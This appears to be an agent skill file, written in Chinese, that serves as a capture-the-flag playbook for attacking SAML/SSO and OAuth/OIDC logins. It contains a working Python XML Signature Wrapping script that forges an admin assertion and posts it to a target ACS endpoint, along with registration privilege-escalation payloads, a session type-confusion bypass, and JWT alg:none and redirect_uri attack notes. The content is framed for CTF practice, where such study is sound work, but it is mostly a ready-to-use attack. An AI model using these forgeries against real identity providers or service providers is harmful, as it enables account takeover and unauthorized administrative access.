---
name: ctf-web-auth-saml
description: CTF SAML/SSO 认证攻击 playbook（web/高投入）。识别/触发指纹：SAML、SSO、XSW、XML签名包装、XML Signature Wrapping、断言 Assertion、Response、NameID、Issuer、AttributeStatement、Attribute、AuthnStatement、InResponseTo、ACS、metadata、证书指纹、签名校验、签名验证、签 Response 还是签 Assertion、SAMLResponse base64、SuccinctSOAPPRequest、OAuth、OIDC、OpenID Connect、jwt alg:none、client_id、redirect_uri、authorization_code、PKCE、id_token。碰到这些指纹（登录跳 IdP/SP、POST SAMLResponse 到 /acs、cookie 改 type/role 越权）时，由二级 ctf-web 路由表调用本 leaf，专项解决“这个 SAML/SSO 考点怎么打”。
---

# CTF SAML/SSO 认证攻击 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲“这个考点怎么打”，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、严格区分“已确认”与“推测”。靶机常不出网 → 优先本地回显（union/error/盲注/文件读/越权登录拿 flag），OOB 仅作概念提及。

## 识别特征（什么时候调我）
- 登录页跳第三方 IdP，回跳时 **POST 一个大 base64 到 `/acs`/`/saml/consume`/`/auth/saml/callback`**，参数名常为 `SAMLResponse`（解码后含 `<samlp:Response`/`<ds:Signature`）。
- Cookie/Header 出现 `eyJ`（JWT，可能是 OIDC id_token），或 url 含 `client_id=`、`redirect_uri=`、`response_type=code`。
- 注册/个人资料页含 `type`/`role`/`level`/`is_admin` 隐藏字段或可写参数，后续接口按它鉴权。
- 报错堆栈泄露 `passport-saml`/`node-saml`/`python3-saml`/`OneLogin`/`SimpleSAMLphp`/`java opensaml`。
- metadata 端点 `/saml/metadata` 可读，暴露证书、NameIDFormat、ACS 位置。
- 源码里搜到 `createLoginResponse`/`responseBuilder`/`validateSignature`/`require(XML签名库)`。

## 核心攻击手法

### 1. XSW（XML Signature Wrapping）—— 最典型 SAML 考点
SP 校验签名时按 `ID` 找被签元素做摘要校验、但**业务取断言数据时取 `assertions[0]`/DOM 第一处**，于是把“未签名但放在签名断言前面的恶意断言”喂给了业务逻辑。

**标准 5 步姿势（删 ID 是关键，避免 `//*[@ID]` 先命中副本致摘要不匹配）**：
1. 复制原始被签 `<saml:Assertion>` 整段
2. 删副本里的 `<ds:Signature>` 整块（让副本成为“无签名断言”）
3. 删副本的 `ID` 属性
4. 改副本里的 `<saml:NameID>` 为受害者/高权账号（`admin@…`、目标邮箱）
5. 把副本**插到原 Response 的签名断言之前**（XSW1：插到 Response 内首子节点；XSW2/3/4/8：包在 Response 外层 / 包在签名对象内，逐个试）

零依赖 Python 串操作构造（避免 lxml 破坏命名空间，参考加速点 3）：
```python
import urllib.parse, base64, requests, re
# raw = 原始 SAMLResponse (已 base64 decode 后的 XML 串)
raw = open('resp.xml').read()
# 抓原断言
m = re.search(r'<saml:Assertion.*?</saml:Assertion>', raw, re.S)
assertion = m.group(0)
# 1-4: 复制 -> 去签名 -> 去 ID -> 改 NameID
evil = assertion
evil = re.sub(r'<ds:Signature.*?</ds:Signature>', '', evil, flags=re.S)
evil = re.sub(r' ID="[^"]*"', '', evil)
evil = re.sub(r'<saml:NameID[^>]*>.*?</saml:NameID>',
              '<saml:NameID>admin@target.local</saml:NameID>', evil, flags=re.S)
# 5: 插到原 Response 内、原断言之前（XSW1）
wrap = raw.replace(assertion, evil + assertion, 1)
payload = base64.b64encode(wrap.encode()).decode()
r = requests.post('http://target/acs',
                  data={'SAMLResponse': payload, 'RelayState': ''},
                  allow_redirects=False)
print(r.status_code, r.headers.get('Location'), r.text[:200])
```

### 2. 签名范围审计（Response vs Assertion）
- 先确认签的到底是 `<samlp:Response>` 还是只签了内部 `<saml:Assertion>`。
- **仅签 Assertion、Response 无签名** → 往 Response 层注入任意新断言不破坏完整性，XSW 几乎免签。审 `<ds:Signature>` 的 `Reference URI="#xxx"` 指向的 ID 是 Response 还是 Assertion 即可判定。
- **Response 整体签名** → 走标准 XSW（§1）。

### 3. type/role 混淆越权注册
注册/资料接口的 `type`/`role` 字段前端校验/`parseInt`/字符串校验 与 DB 存储类型不一致时可越权。链路（实证题路径）：
```
前端隐藏 type=0(普通) -> 绕过：传 type=1/type="admin" -> parseInt("abc")=NaN / 校验只查 truthy -> MySQL 非严格模式 TINYINT 存 0 -> 但校验层放行非数字
```
payload 试：`type=1`、`type=admin`、`type=0x01`、`role=2`、`is_admin=true`，注册后看是否拿到管理面/flag。

### 4. session 严格比较绕过
自注册后 session 直接存 `req.body.type`（字符串 `"1"`），门禁若用 `req.session.type !== 0`（数字）等严格比较会因类型不符误拒。**重新登录**让 session 从 DB 读数字类型即可绕过。区分“已确认”：改 type 后先重新登录一次再访问门禁接口，别靠推理。

### 5. NameID 来源审计
审 IdP 端 `createLoginResponse`/`responseBuilder`/`Strategy`，确认 nameID 取的是 **email 还是 username**——决定 XSW 里要伪造哪个字段（§1 第 4 步）。同时看 SP 端是否按 nameID 直接建账/绑定现有账号，若按 email 绑且 email 可控 → 伪造受害者 email 即登其账号。

### 6. OAuth/OIDC 常见断点
- **alg:none / 弱密钥**：id_token/access_token 是 JWT，改 header `{"alg":"none"}` 去签名段重放（见 `ctf-web-jwt`，若有）。
- **redirect_uri 校验不严**：`redirect_uri` 可指向攻击者域 / 开放重定向 → 接 code（CTF 靶机常不出网，优先改 redirect_uri 到题目自己的回显接口 / 用 Burp Collaborator 本地替代品）。
- **state 缺失/不校验** → CSRF 绑定他人账号。
- **PKCE 缺失 + public client** → 截 code。
- **account linking 逻辑漏洞**：IdP 返回 email 与本地 admin 账号同邮箱 → 直接接管。

## CTF 实战结晶
- **XSW 5 步姿势**（迁入自 ctf-web 速查，确认为实战路径）：复制断言 → 删 `ds:Signature` → **删 ID 属性**（关键，否则 `//*[@ID]` 先命中副本致摘要不匹配、签名校验仍过但取数取副本） → 改 NameID 为目标账号 → 插到原断言前。`Reference URI` 指向原 ID，签名仍验过；SP 取 `assertions[0]` 拿到恶意断言。
- **签名范围决定打法**：签 Response 走 XSW1-8；仅签 Assertion 则 Response 层免签注入更简单。先 grep `Reference URI="#"` 判定（已确认手法）。
- **type 越权链（parseInt + MySQL 非严格）**：注册传非常量 type 值，`parseInt`/字符串校验层放行 + MySQL TINYINT 静默截断/存 0，但应用层按 truthy/另一类型判断 → 越权建管理账号。payload：`type=1`、`type=admin`、`type=2`（实证，结合门禁实际比较运算符选值）。
- **session 严格比较绕过**：自注册后 session 存字符串，门禁用 `!== 数字` 误拒 → 重新登录让 session 从 DB 读数字类型即过（已确认：先重登再试门禁，别靠推理）。
- **nameID 来源审计**：审 `createLoginResponse`/`responseBuilder`，确认取 email 还是 username，决定 XSW 伪造哪个字段（已确认手法；具体取值先测一次，参考 ctf-web 加速点 4「测试优先于推理」）。
- **验证纪律**：拿到 flag 后做**一次**对比验证（XSW 注入不同 nameID 看 403 vs flag）证明非假阳性即可，不做本地全栈复现（参考 ctf-web 加速点 5）。
- （OAuth/OIDC 链路：待积累具体题，下次遇到回填此处。）

## 工具命令
```bash
# 一键解 SAMLResponse 看 XML 结构
echo '<BASE64_SAMLRESPONSE>' | base64 -d | xmllint --format - | less
# 抓签名引用对象（判定签 Response 还是 Assertion）
echo '<BASE64>' | base64 -d | grep -oE 'Reference (URI|Id)="#[^"]*"'
# 多步 SSO 流程（注册->登录->IdP->ACS）用 Python requests，别用 curl cookie jar（跨 host 丢 cookie 出假阴性）
#   参见 ctf-web 加速点 2
# Burp 拦 ACS 请求 -> create_repeater_tab 改 SAMLResponse 重放（首选），降级 curl
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/saml-sso-assertion-attacks/SKILL.md
- hack-skills-main/skills/oauth-oidc-misconfiguration/SKILL.md
- hack-skills-main/skills/jwt-oauth-token-attacks/SKILL.md

## 关联 leaf
- `ctf-web`（二级路由：本 leaf 由它调度）
- `ctf-web-deser`、`ctf-web-ssrf`（Fakebook 式链路：sqli → 反序列化 → ssrf，常与认证后内网打通串成）
- `ctf-web-sqli`（type/role 越权常伴 MySQL 非严格模式，与注入同源）
